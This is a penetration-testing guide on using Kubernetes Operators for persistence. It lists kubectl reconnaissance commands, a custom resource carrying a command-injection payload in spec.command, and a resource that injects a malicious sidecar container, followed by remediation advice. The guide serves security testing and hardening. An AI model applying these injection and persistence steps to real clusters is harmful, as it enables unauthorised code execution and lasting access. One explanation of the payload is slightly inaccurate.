
# Kubernetes Penetration Testing: Operator-Based Persistence Mechanisms

## 1. Overview Section

### Attack Vector Description

Operators in Kubernetes automate the deployment, management, and scaling of applications. While designed for efficiency, misconfigured or compromised Operators can provide attackers with persistent access to the cluster. An attacker can leverage the custom resources (CRDs) managed by an operator to create malicious workloads that are automatically recreated even after deletion. This constitutes a robust persistence mechanism.

### Potential Impact and Consequences

Successful exploitation allows the attacker to:

*   Maintain persistent access to the Kubernetes cluster.
*   Execute arbitrary code within the cluster's environment.
*   Compromise data managed by the cluster's applications.
*   Use the cluster resources for malicious activities like crypto mining or launching attacks on other systems.
*   Pivot to other resources within the network.

### Risk Level Assessment

**Critical** due to the ability to establish persistent, privileged access to the cluster, leading to complete compromise.

### Technical Explanation of Why This Vulnerability Exists

The vulnerability stems from several factors:

*   **Overly Permissive Operator Roles:** Operators may be granted excessive permissions (e.g., cluster-admin), allowing them to create and manage all resources in the cluster.
*   **Insecure Custom Resource Definitions (CRDs):** CRDs may lack proper validation, allowing attackers to inject malicious configurations that the Operator will then enforce.
*   **Lack of Input Validation in Operator Logic:**  The operator code itself may not sanitize or validate the input it receives from CRs, enabling command injection or other code execution vulnerabilities.
*   **Vulnerable Operator Images:**  The operator image itself may be outdated and contain known vulnerabilities.

The underlying cause is the Operator's automation of resource management; an attacker can abuse this automation to their advantage. The Operator, designed to maintain the desired state of a Kubernetes application, can inadvertently maintain a malicious state if compromised.

### Prerequisites and Conditions Needed

*   **Access to the Kubernetes API:** The attacker needs sufficient privileges to create and modify Custom Resources (CRs) managed by the targeted Operator. This might be achieved through compromised credentials or exploitation of another vulnerability.
*   **Knowledge of Target Operator:** Understanding the CRDs managed by the Operator and how the Operator reacts to changes in these CRs is crucial.
*   **Vulnerable or Misconfigured Operator:**  The Operator must either have inherent vulnerabilities in its code, overly permissive RBAC, or poorly defined CRD validation.

## 2. Validation and Exploitation Steps Section

This section outlines the process of identifying, validating, and exploiting an operator-based persistence mechanism. We will assume a hypothetical Operator named "MyOperator" manages a CRD called "MyResource".

### Phase 1: Reconnaissance and Identification

**Step 1: Enumerate Custom Resource Definitions (CRDs)**

```bash
kubectl get crd
```

**Explanation:**  This command lists all installed Custom Resource Definitions within the cluster.  We are looking for CRDs that might belong to a potentially vulnerable Operator.
**Expected Output:**  A list of CRDs.  Look for a CRD name like `myresources.example.com`.
**Why:** Understanding installed CRDs is essential for identifying potential targets.

**Step 2: Describe the Target CRD**

```bash
kubectl describe crd myresources.example.com
```

**Explanation:**  This command provides details about the "MyResource" CRD, including its schema, versions, and accepted fields. This is vital for understanding how to craft malicious CRs.
**Expected Output:** The YAML definition of the CRD, including specifications for each field.  Pay close attention to any fields that accept user-provided input (e.g., `spec.command`).
**Why:** This helps identify potentially exploitable fields within the CRD.

**Step 3: Inspect Operator Pods**

```bash
kubectl get pods -n <operator_namespace> -l app=myoperator
kubectl describe pod <operator_pod_name> -n <operator_namespace>
```

**Explanation:**
1.  The first command lists pods in the operator's namespace (replace `<operator_namespace>` with the actual namespace, e.g., `myoperator-system`) that have the label `app=myoperator`. This identifies the Operator's pod(s).
2.  The second command describes the Operator's pod. This reveals information about the image used, volumes mounted, and any other details that might indicate misconfigurations.
**Expected Output:**
1.  A list of pods managed by the Operator.
2.  Detailed information about the Operator's pod, including the image name, mounted volumes, environment variables, and RBAC roles.
**Why:**  This allows us to investigate the Operator's configuration and potentially uncover vulnerabilities in the image or RBAC setup.

**Step 4: Check RBAC permissions of the Operator Service Account**

```bash
kubectl describe rolebinding -n <operator_namespace> | grep myoperator-sa
kubectl describe clusterrolebinding | grep myoperator-sa
```

**Explanation:** This checks the RoleBindings and ClusterRoleBindings associated with the Operator's Service Account (`myoperator-sa`). Overly permissive roles grant the Operator excessive privileges.
**Expected Output:** Details of the RoleBindings and ClusterRoleBindings. Look for bindings granting cluster-admin or other highly privileged roles.
**Why:** Overly permissive RBAC is a common misconfiguration that can be exploited.

### Phase 2: Validation and Exploitation

**Scenario:** Assume the "MyResource" CRD contains a field `spec.command` that the Operator executes.  This is a classic command injection vulnerability.

**Step 5: Craft a Malicious Custom Resource**

Create a YAML file (e.g., `evil.yaml`) containing the following:

```yaml
apiVersion: example.com/v1alpha1
kind: MyResource
metadata:
  name: evil-resource
spec:
  command: "whoami; echo 'VULNERABLE' > /tmp/vulnerable"
```

**Explanation:** This YAML defines a custom resource named "evil-resource" of kind "MyResource".  The `spec.command` field contains a command injection payload.  `whoami` executes the command `whoami` and then pipes output to `/tmp/vulnerable`. This is a simple proof of concept.
**Expected Output:** None yet - this is just a configuration file.
**Why:** To inject a malicious command that the Operator will execute.

**Step 6: Create the Malicious Custom Resource**

```bash
kubectl apply -f evil.yaml
```

**Explanation:**  This command applies the YAML file, creating the "evil-resource" Custom Resource in the cluster. This triggers the Operator to reconcile the resource.
**Expected Output:** `myresource.example.com/evil-resource created`
**Why:** This prompts the Operator to process the injected command.

**Step 7: Verify Command Execution**

```bash
kubectl exec -it <operator_pod_name> -n <operator_namespace> -- cat /tmp/vulnerable
```

**Explanation:** This command executes `cat /tmp/vulnerable` inside the Operator's pod to check if the injected command was executed and the file was created.  Replace `<operator_pod_name>` with the actual name of the Operator's pod.
**Expected Output:** `VULNERABLE`
**Why:** This confirms that the command injection vulnerability is exploitable.

**Alternative approach:** If you suspect that the operator is restarting pods based on a CRD, you can attempt to inject a malicious initContainer or sidecar container into a pod managed by the operator, using the operator itself.

**Step 8 (Alternative): Craft a Malicious Custom Resource to inject a sidecar container**

Create a YAML file (e.g., `evil2.yaml`) containing the following:

```yaml
apiVersion: example.com/v1alpha1
kind: MyResource
metadata:
  name: evil-resource-sidecar
spec:
  podSpecPatch: |
    spec:
      containers:
      - name: evil-sidecar
        image: busybox
        command: ["/bin/sh", "-c", "while true; do sleep 3600; done"] # keep container alive
```

**Explanation:** This YAML defines a custom resource which attempts to modify the pod spec by injecting a sidecar container based on `busybox`. The command inside the container simply sleeps forever. The `podSpecPatch` is a fictional field in `MyResource` that allows modifying the Pod specification.
**Expected Output:** None yet - this is just a configuration file.
**Why:** To inject a malicious sidecar that provides persistent access to the pod's network and filesystem.

**Step 9 (Alternative): Create the Malicious Custom Resource**

```bash
kubectl apply -f evil2.yaml
```

**Explanation:**  This command applies the YAML file, creating the `evil-resource-sidecar` Custom Resource in the cluster. This triggers the Operator to reconcile the resource.
**Expected Output:** `myresource.example.com/evil-resource-sidecar created`
**Why:** This prompts the Operator to inject the specified container.

**Step 10 (Alternative): Check if the Sidecar Container was injected**

```bash
kubectl get pods -l myoperator.example.com/controlled-by=myresource/evil-resource-sidecar # replace label appropriately
kubectl describe pod <pod_name>
```

**Explanation:** The first command tries to find the pod affected by `MyResource` by using a label that's applied automatically to the resources managed by operator. It is important to figure out label being set. Then the second command shows the pod, you should see the `evil-sidecar` container.
**Expected Output:**  You should see the Pod controlled by the `MyResource` you created.  In the `describe pod` output, you will see the `evil-sidecar` container definition.
**Why:** Validates if the container was added.

### Phase 3: Persistence

The exploit described above already provides persistence, as the Operator will continuously recreate any resources defined in the malicious CR.  Deleting the resulting pods will trigger the Operator to recreate them based on the CRD definition.

### Remediation Recommendations

*   **Least Privilege RBAC:**  Grant Operators only the minimum necessary permissions to perform their tasks. Avoid granting cluster-admin privileges.
*   **Strict CRD Validation:**  Implement robust validation for CRDs to prevent the injection of malicious configurations. Use OpenAPI schemas to define acceptable values and patterns.
*   **Input Sanitization:**  Sanitize and validate all input received from CRs within the Operator's code.  Prevent command injection, path traversal, and other code execution vulnerabilities.
*   **Secure Operator Images:**  Regularly update and scan Operator images for vulnerabilities. Use security hardening techniques to minimize the attack surface.
*   **Regular Audits:**  Conduct regular security audits of Operator deployments to identify and address potential vulnerabilities.
*   **Principle of Least Privilege for Users:** Make sure that developers/users don't have permissions to create CRs in production environments. Restrict this permission to only required roles/users.
*   **Use admission webhooks**: Implement admission webhooks to validate and mutate resources before they are persisted to the cluster. This helps ensure that only valid and safe resources are created.
